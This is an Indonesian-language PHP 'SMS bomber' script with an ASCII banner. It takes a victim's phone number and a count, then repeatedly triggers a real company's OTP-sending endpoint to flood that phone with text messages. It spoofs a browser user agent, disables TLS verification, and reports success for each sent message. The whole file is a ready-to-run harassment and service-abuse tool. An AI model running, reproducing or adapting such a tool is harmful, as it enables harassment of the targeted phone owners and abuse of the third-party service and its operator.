<?php

//script bom sms
function sms($target, $jumlah) {
	for ($i=1; $i <= $jumlah; $i++) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "https://www.phd.co.id/id/users/sendOTP");
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, "phone_number=$target");
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");
			$x = curl_exec($ch);
			curl_close($ch);
			//echo $x."\n";
			
			if (preg_match('/We have sent an OTP to your phone, Please enter the 4 digit code./', $x)) {
				echo $i."\033[92mBERHASIL\n";
				}else{
					echo $i."\033[91mGAGAL\n";
		}
	}
}

$banner = "\033[91m────────▓▓▓▓▓▓▓────────────▒▒▒▒▒▒
──────▓▓▒▒▒▒▒▒▒▓▓────────▒▒░░░░░░▒▒
────▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓────▒▒░░░░░░░░░▒▒▒
───▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒░░░░░░░░░░░░░░▒
──▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░▒
──▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░▒
─▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░▒
▓▓▒▒▒▒▒▒░░░░░░░░░░░▒▒░░▒▒▒▒▒▒▒▒▒▒▒░░░░░░▒
▓▓▒▒▒▒▒▒▀▀▀▀▀███▄▄▒▒▒░░░▄▄▄██▀▀▀▀▀░░░░░░▒
▓▓▒▒▒▒▒▒▒▄▀████▀███▄▒░▄████▀████▄░░░░░░░▒
▓▓▒▒▒▒▒▒█──▀█████▀─▌▒░▐──▀█████▀─█░░░░░░▒
▓▓▒▒▒▒▒▒▒▀▄▄▄▄▄▄▄▄▀▒▒░░▀▄▄▄▄▄▄▄▄▀░░░░░░░▒
─▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░▒
──▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░▒
───▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▀▀░░░░░░░░░░░░░░▒
────▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░▒▒
─────▓▓▒▒▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▄░░░░░░░░▒▒
──────▓▓▒▒▒▒▒▒▒▄▀▀▀▀▀▀▀▀▀▀▀▄░░░░░▒▒
───────▓▓▒▒▒▒▒▀▒▒▒▒▒▒░░░░░░░▀░░░▒▒
────────▓▓▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒
──────────▓▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒
───────────▓▓▒▒▒▒▒▒▒▒░░░░░░░▒▒
─────────────▓▓▒▒▒▒▒▒░░░░░▒▒
───────────────▓▓▒▒▒▒░░░░▒▒
────────────────▓▓▒▒▒░░░▒▒
──────────────────▓▓▒░▒▒
───────────────────▓▒░▒
────────────────────▓▒

\033[95mauthor : \033[00mBLANK
\033[92msixtysix-Team

\033[91m[\033[93m#\033[91m] \033[93mspam sms \033[91m[\033[93m#\033[91m]\n\n\n";

system('clear');
echo $banner;
echo "\033[91mexample (88*******)\n\033[92mmasukkan nomor :";
$nomor = trim(fgets(STDIN));
sleep(1);
echo "\033[91mmaksimal 3 pesan\n";
sleep(1);
echo "\033[92mmasukkan jumlah pesan :";
$jumlah = trim(fgets(STDIN));
echo "\n\n\033[93mRESULT\n\n";
$eksekusi = sms($nomor, $jumlah);
print $eksekusi;
?>